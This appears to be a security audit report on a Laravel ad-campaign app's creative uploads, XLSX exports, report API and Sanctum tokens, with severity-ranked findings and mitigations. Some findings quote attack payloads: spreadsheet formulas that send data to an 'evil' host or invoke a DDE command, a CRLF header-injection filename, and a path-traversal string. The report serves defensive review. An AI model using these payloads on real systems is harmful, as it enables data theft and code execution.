# Chunk 3 — Creatives/Reports/Exports (Security)

**Date:** 2026-04-05
**Scope:** `CreativeController`, `DashboardController`, `ReportApiController`, `TokenController`, `Creative*` models/observers, `app/Exports/*`, `ReportImportService`, creative form requests, `/api/reports/*` routes.

---

## AI Key/Secret Exposure Check

No use of `env()`, `config('services.*')`, API keys, or other secrets was observed in this chunk's controllers, exports, views, services, or JSON responses. Confirmed:

- `ReportApiController` JSON responses contain only campaign metrics / IDs / names — no secrets.
- `app/Exports/*` Blade views (`exports/campaign_by_dates.blade.php`, `campaign_by_placements.blade.php`, `campaign_summary.blade.php`) render only metrics, campaign name, and `$user->hasPermission('can_view_budget')`-gated budget fields. No env/config reads, no token values, no stack traces.
- `TokenController::store()` correctly returns `plainTextToken` only once via flash session — this is expected Sanctum behavior, not a leak (the hashed token is stored in DB; plain is shown once).
- `ReportImportService` does not log file contents.
- No `dd()`, `dump()`, `Log::error($e)` with secret context, or `->toArray()` on secret-bearing models found in scope.

**Status:** PASS for this chunk. (Global recommendation: ensure `APP_DEBUG=false` in production so stack traces from these endpoints do not leak config.)

---

## Critical

### C1. Route-model-bound `CreativeFile` lacks explicit creative existence check (IDOR via orphaned record)
- **Severity:** Critical (theoretical) / High (practical)
- **Location:** `app/Http/Controllers/CreativeController.php:166,176,197` (`deleteFile`, `preview`, `downloadFile`)
- **CWE:** CWE-639 (IDOR) / CWE-476 (null deref)
- **Scenario:** These actions resolve `CreativeFile` by primary key (`/creatives/files/{file}/...`) and authorize via `$file->creative->campaign`. If a `CreativeFile` row exists but its parent `Creative` was hard-deleted (no FK cascade enforced in code path), `$file->creative` is `null`, calling `->campaign` triggers a TypeError → 500. While Laravel cascades through Eloquent events, a failed transaction or manual DB edit could leave orphans, and the dereference chain skips an explicit tenant check on `creative_id` → `campaign_id`. More importantly, **the IDOR surface is wide**: any authenticated user guessing a `CreativeFile` ID will have the policy evaluated only through its linked campaign. This is currently safe, but the pattern has no defence-in-depth.
- **Mitigation:**
  ```php
  public function deleteFile(\App\Models\CreativeFile $file)
  {
      abort_unless($file->creative && $file->creative->campaign, 404);
      $this->authorize('update', $file->creative->campaign);
      // ...
  }
  ```
  Additionally enforce FK cascade in migration: `$table->foreignId('creative_id')->constrained()->cascadeOnDelete();`.

---

## High

### H1. Excel/CSV formula injection in XLSX exports
- **Severity:** High
- **Location:**
  - `resources/views/exports/campaign_by_placements.blade.php:19` (`{{ $row['name'] }}` = placement name, user-controlled via uploaded report)
  - `resources/views/exports/campaign_summary.blade.php:9` (`{{ $campaign->name }}`)
  - `resources/views/exports/campaign_by_dates.blade.php:19` (`{{ $row['report_date'] }}` — low risk, but untrusted)
  - `app/Http/Controllers/DashboardController.php:67` — filename `'MadData_'.$campaign->name.'.xlsx'`
- **CWE:** CWE-1236 (Improper Neutralization of Formula Elements in a CSV File) / OWASP: Injection
- **Scenario:** Placement names come from uploaded ad-network reports (`ReportImportService` writes `'name' => $placement` from a CSV cell with no sanitization). An attacker who controls a placement/bundle name (e.g., an upstream DSP feed) can set it to `=HYPERLINK("http://evil/"&A1,"Click")` or `=cmd|'/c calc'!A1`. When a MadData user opens the exported XLSX, Excel interprets the cell as a formula, leading to data exfiltration or RCE via DDE on vulnerable clients. Campaign name is also user-controlled by admins creating campaigns.
- **Mitigation:** Prefix any cell starting with `=`, `+`, `-`, `@`, `\t`, `\r` with a single quote or space. Add a helper:
  ```php
  // app/Support/CsvGuard.php
  public static function safe(?string $v): string {
      if ($v === null) return '';
      return preg_match('/^[=+\-@\t\r]/', $v) ? "'".$v : $v;
  }
  ```
  Use `{{ \App\Support\CsvGuard::safe($row['name']) }}` in all export Blade files. Also sanitize the filename: `Str::slug($campaign->name)` for the download filename.

### H2. HTTP response-splitting / path-traversal via untrusted `name` in `downloadFile`
- **Severity:** High
- **Location:** `app/Http/Controllers/CreativeController.php:205` — `Storage::disk('creatives')->download($file->path, $file->name)`
- **CWE:** CWE-113 (HTTP Response Splitting) / CWE-22 (Path Traversal)
- **Scenario:** `$file->name` stores `$file->getClientOriginalName()` unsanitized (line 152). An attacker can upload a file named `"\r\nSet-Cookie: session=evil\r\n\r\n<script>.png"` or `../../../etc/passwd`. While Laravel's `ResponseFactory::download()` wraps the filename in `Content-Disposition` with ASCII/UTF-8 encoding via Symfony `HeaderUtils::makeDisposition()`, older Symfony versions did not strip CR/LF reliably, and older browsers parsed UTF-8 filenames differently. The filename is also echoed into `zip->addFromString($file->name, ...)` in `downloadAll` where path-traversal inside the ZIP is viable (Zip Slip) — an extractor that does not sanitise entry names will write outside the intended directory.
- **Mitigation:**
  ```php
  // On upload:
  $safeName = preg_replace('/[^\w\-. ]+/u', '_', $file->getClientOriginalName());
  $safeName = basename($safeName); // strip any path components
  $creative->files()->create(['name' => $safeName, ...]);
  ```
  And in `downloadAll`, use `basename($file->name)` when adding to the zip.

### H3. Report API caches user-controlled, unvalidated `start`/`end` as cache keys
- **Severity:** High (DoS via cache bloat) / Medium (logic)
- **Location:** `app/Http/Controllers/ReportApiController.php:28,95,158`
- **CWE:** CWE-20 (Improper Input Validation) / CWE-400 (Resource Exhaustion)
- **Scenario:** `start` and `end` come straight from query string with no validation and are embedded into cache keys (`report_summary_{$campaign->id}_v{$version}_{$start}_{$end}_...`). An attacker with a valid token can iterate `?start=2020-01-01&end=<any string>` millions of times, filling Redis/file cache and consuming disk/memory. Additionally, arbitrary strings passed to `whereBetween('report_date', [$start, $end])` will produce DB errors on malformed input (no 4xx returned to caller — raw 500 instead).
- **Mitigation:** Use a FormRequest or inline validation:
  ```php
  $validated = validator(request()->only('start','end'), [
      'start' => 'nullable|date_format:Y-m-d',
      'end'   => 'nullable|date_format:Y-m-d|after_or_equal:start',
  ])->validate();
  ```
  Apply to `summary`, `byDate`, `byPlacement`, and `campaigns`. Reject unknown formats before hashing into a cache key.

### H4. `ReportImportService::import` trusts uploaded spreadsheet with no file-level validation
- **Severity:** High
- **Location:** `app/Services/ReportImportService.php:33-35`
- **CWE:** CWE-434 (Unrestricted File Upload)
- **Scenario:** `Excel::toCollection(null, $file)` is invoked directly on an `UploadedFile` with no MIME/extension/size check *inside the service*. It relies on the caller (a controller not in this chunk) to validate. PhpSpreadsheet has had CVEs (XXE via ODS/XLSX, formula eval). A 500 MB XLSX or a bomb-style XLSX can DoS the worker. XXE risk persists if older PhpSpreadsheet versions are present.
- **Mitigation:** Validate at the service boundary:
  ```php
  if ($file->getSize() > 25 * 1024 * 1024) abort(422, 'File too large.');
  $ext = strtolower($file->getClientOriginalExtension());
  if (! in_array($ext, ['xlsx','xls','csv'], true)) abort(422, 'Invalid file type.');
  ```
  Keep PhpSpreadsheet ≥ 1.29 (XXE hardening). Run the import in a queued job with memory limits.

### H5. Excel sheet title collision / injection via `$campaign->name` in filename
- **Severity:** Medium-High
- **Location:** `app/Http/Controllers/DashboardController.php:67`
- **CWE:** CWE-20
- **Scenario:** `'MadData_'.$campaign->name.'.xlsx'` — if `$campaign->name` contains `/`, `\`, `"`, `\r\n`, or Unicode RTL characters, the HTTP `Content-Disposition` filename can be spoofed (e.g., a file appearing as `report.pdf` when it is XLSX). Response-splitting via CRLF is partially handled by Symfony but relying on that for defence-in-depth is weak.
- **Mitigation:** `Str::slug($campaign->name, '_')` or `preg_replace('/[^\w\-]+/u','_', $campaign->name)` before concat.

---

## Medium

### M1. Campaign name / token name / creative name stored without server-side length+charset normalization
- **Severity:** Medium
- **Location:** `app/Http/Controllers/TokenController.php:19-21`, `StoreCreativeRequest.php:17`
- **CWE:** CWE-79 (stored XSS sink)
- **Scenario:** Token name accepts any 255-char string. It is rendered later in `tokens.index` view — verify that view uses `{{ }}` escaping (typically safe). Same for creative `name`. With `{{ }}` this is safe; with `{!! !!}` anywhere it is XSS.
- **Mitigation:** Confirm all token/creative name views use `{{ }}`. Add `|regex:/^[\p{L}\p{N}\s\-_.]+$/u` to request validation to restrict to printable safe chars.

### M2. `CreativeFile` mass-assignment exposes `path` and `mime_type`
- **Severity:** Medium
- **Location:** `app/Models/CreativeFile.php:9-17`
- **CWE:** CWE-915 (Improperly Controlled Modification of Dynamically-Determined Object Attributes)
- **Scenario:** `$fillable` includes `path` and `mime_type`. If any future code path does `CreativeFile::create($request->all())` (instead of the hand-built array in `CreativeController::upload`), an attacker could set `path` to point to any file on the `creatives` disk and `mime_type` to `text/html` — then `preview()` would serve someone else's file with a chosen content-type. Currently the controller uses explicit values, so this is latent, not exploitable today.
- **Mitigation:** Remove `path`, `mime_type` from `$fillable` (assign via `->path = ...; ->save();`) or keep but add a lint/test asserting no direct `::create($request->...)` usage.

### M3. Sanctum token has no rotation / rate limit and 30-day expiry extension is unlimited
- **Severity:** Medium
- **Location:** `app/Http/Controllers/TokenController.php:17-46`
- **CWE:** CWE-307 (Improper Restriction of Excessive Authentication Attempts) / CWE-613 (Insufficient Session Expiration)
- **Scenario:**
  1. No throttle middleware on `/tokens` POST — a compromised browser session can mint unlimited tokens.
  2. `extend()` adds 30 days from *now* (not current expiry), so a token can be extended forever. No absolute lifetime cap.
  3. `destroy()`/`extend()` are CSRF-protected by web middleware (OK), but an attacker with a stolen session could extend indefinitely.
- **Mitigation:**
  - Add `throttle:10,1` middleware to token routes.
  - Cap extensions: `if ($token->created_at->lt(now()->subMonths(6))) abort(422, 'Token too old; create a new one.');`
  - Limit tokens per user (e.g., max 5 active).

### M4. `campaigns()` report endpoint returns non-accessible campaigns if admin flag bypasses pivot (by design, but risk on escalation)
- **Severity:** Medium (by-design)
- **Location:** `app/Http/Controllers/ReportApiController.php:205-233`
- **CWE:** CWE-285 (Improper Authorization)
- **Scenario:** The endpoint does not call `$this->authorize('viewAny', Campaign::class)` — it inlines the admin check. It also omits `whereHas` scoping if `Auth::user()->hasPermission('is_admin')` returns true. That is consistent with the policy, but note: `created_at` filter vs. business intent (report periods should be by `start_date`/`end_date`, not creation date). An admin seeing all campaigns is OK; but if `is_admin` ever becomes granted too liberally, this endpoint exfiltrates *all* tenants at once via a single token.
- **Mitigation:** Use the policy uniformly: `Campaign::query()->visibleTo(Auth::user())` via a scope. Also return only whitelisted fields (already done in `transform`, good).

### M5. `downloadAll` temp ZIP written with `0750` and no lifecycle guard
- **Severity:** Medium
- **Location:** `app/Http/Controllers/CreativeController.php:219-241`
- **CWE:** CWE-377 (Insecure Temporary File)
- **Scenario:** If `deleteFileAfterSend(true)` fails (e.g., connection aborted mid-download), the ZIP lingers in `storage/app/temp` forever. Random 16-char name prevents guessing, but accumulation is a disk-DoS vector. Also the directory isn't excluded from backups.
- **Mitigation:** Add a scheduled command `php artisan schedule:command` to prune `storage/app/temp` of files > 1h old. Consider streaming the ZIP via `ZipStream-PHP` instead of writing to disk.

### M6. `getimagesize()` / `shell_exec(ffprobe)` on user-uploaded files
- **Severity:** Medium
- **Location:** `app/Http/Controllers/CreativeController.php:102,111-114`
- **CWE:** CWE-78 (OS Command Injection — mitigated) / CWE-20
- **Scenario:** `shell_exec('ffprobe ... '.escapeshellarg(...))` is safe because path is escaped. However, if `ffprobe` is not installed on the server, `shell_exec` returns `null` (OK) — but a hostile `ffprobe` binary on `$PATH` would execute. Minor concern. `getimagesize()` has historical CVEs on malformed images. Since the file is re-encoded through Intervention Image immediately after (stripping EXIF), risk is reduced.
- **Mitigation:**
  - Use `Symfony\Component\Process\Process` with absolute path: `new Process(['/usr/bin/ffprobe', ...])`.
  - Wrap `getimagesize` in `@` suppression and validate result types.
  - Consider using `php-ffmpeg/php-ffmpeg` library to avoid shell entirely.

### M7. SVG uploads implicitly blocked but image MIME list allows `image/gif` which can host polyglots
- **Severity:** Low-Medium
- **Location:** `app/Http/Controllers/CreativeController.php:21-23`
- **CWE:** CWE-434
- **Scenario:** SVG is correctly excluded from `ALLOWED_MIME_TYPES`. GIF/JPEG/PNG can still be polyglots (e.g., GIFAR). Re-encoding through Intervention Image (`$manager->read()->encodeByMediaType()`) does strip trailing archive data — good. But videos are written via raw `fopen`/stream with no re-muxing, so MP4/WebM polyglots pass through. The nosniff + strict CSP headers on `preview()` mitigate browser execution.
- **Mitigation:** Current defense (nosniff + CSP `default-src 'none'` + `Content-Disposition: inline`) is strong. Consider also `X-Frame-Options: DENY` on the preview response.

---

## Low

- **L1.** `CreativeObserver::updated` interpolates raw `$value` into activity log description (`$key.': "'.$value.'"'`). If a future `Creative` field stores binary/HTML, logs may render oddly or create log-injection vectors when logs are displayed in admin UI. Ensure admin log viewer uses `{{ }}`.
- **L2.** `ReportApiController` responses do not set `Cache-Control: private, no-store` — cached at proxies, metrics could be served to the wrong tenant if a reverse proxy is misconfigured.
- **L3.** `TokenController::index` returns only `id, name, created_at, expires_at` — safe. But token `id` is auto-increment; consider UUIDs to prevent token-count enumeration.
- **L4.** `preview()` sends `Content-Disposition: inline` with arbitrary `mime_type` stored in DB. Since value is derived from server-side `getMimeType()` (not client-supplied) this is safe, *unless* mass-assignment via `CreativeFile::create($request->all())` is ever introduced (see M2).
- **L5.** `ReportImportService` calls `$campaign->update(['is_video' => true])` and `$campaign->update(['uniques' => ...])` within import, bypassing request validation. Fine today, but if `Campaign::$fillable` expands, an attacker-controlled header row could pivot this into unexpected writes — keep a tight `$fillable` on `Campaign`.
- **L6.** Zip file name uses `Str::random(16)` (62^16 entropy) — sufficient. No issue.
- **L7.** `$campaign->data()` relationship is assumed to exist; no fallback if relationship undefined. Not a security issue.

---

## Informational / Passed Checks

- Auth middleware wraps all web routes; `auth:sanctum` + `check-token-expiry` + `ability:reports:read` wraps `/api/reports/*`. Correct stacking.
- `CampaignPolicy::view` and `update` correctly intersect `hasPermission` with `accessibleClientIds()->contains($campaign->client_id)` — tenant isolation holds.
- `CreativeController` calls `$this->authorize(...)` on every action, gated on the parent `Campaign` (proper transitive authorization).
- Creative file upload re-encodes images through Intervention Image — strips EXIF and malicious trailing bytes.
- Preview response sets `X-Content-Type-Options: nosniff`, `Content-Security-Policy: default-src 'none'`, `Content-Disposition: inline` — strong browser hardening.
- `Storage::disk('creatives')` points to `storage/app/creatives`, outside webroot — files not directly reachable, must go through authorized controller.
- Sanctum tokens are scoped with ability `reports:read` and enforced via `ability:reports:read` middleware.
- `CheckTokenExpiry` middleware rejects expired tokens with 401 JSON — correct.
- `TokenController::destroy/extend` are scoped via `Auth::user()->tokens()` — users cannot touch other users' tokens.
- `StoreCreativeRequest` / `UpdateCreativeRequest` use strict validation with URL max length and boolean coercion.
- `Creative` and `CreativeFile` models both declare explicit `$fillable` (no `$guarded = []`).
- Eloquent query builder is used throughout; no raw SQL concatenation with user input observed in this chunk.
- Report API JSON responses contain no password hashes, internal secrets, or PII beyond campaign names/metrics.
- Per-user scoping in `TokenController`: `Auth::user()->tokens()->where('id', $id)->firstOrFail()` prevents IDOR on token IDs.
